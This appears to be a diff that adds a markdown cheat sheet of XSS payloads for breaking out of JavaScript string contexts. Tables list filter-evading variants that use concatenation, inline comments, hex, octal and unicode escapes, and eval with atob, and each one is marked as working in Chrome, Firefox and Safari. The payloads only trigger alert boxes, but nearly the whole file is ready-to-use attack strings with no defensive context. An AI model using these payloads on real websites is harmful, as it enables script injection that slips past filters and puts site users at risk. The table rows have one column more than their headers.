@@ -1,0 +1,66 @@
+# XSS Payloads into JavaScript Strings
+
+## String Concatenation
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Self** | `';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This** | `';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top** | `';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent** | `';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames** | `';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Comment Syntax
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window** | `';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self** | `';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This** | `';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top** | `';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent** | `';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames** | `';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Hex Escape Sequences
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window** | `';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self** | `';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This** | `';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top** | `';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent** | `';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames** | `';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Hex Escape Sequence and Base64 Encoded String
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window** | `';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self** | `';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This** | `';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top** | `';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent** | `';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames** | `';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Octal Escape Sequences
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window** | `';window['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Self** | `';self['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **This** | `';this['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Top** | `';top['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Parent** | `';parent['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **Frames** | `';frames['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+| **GlobalThis** | `';globalThis['\141\154\145\162\164']('\130\123\123');` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
+
+## Unicode Escape Sequences
+
+| **Payload** | **Chrome** | **Firefox** | **Safari** | **Link** |
+|-------------|------------|-------------|------------|----------|
+| **Window** | `';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//` | ✔️ | ✔️ | ✔️ | [Jump to the code](#) |
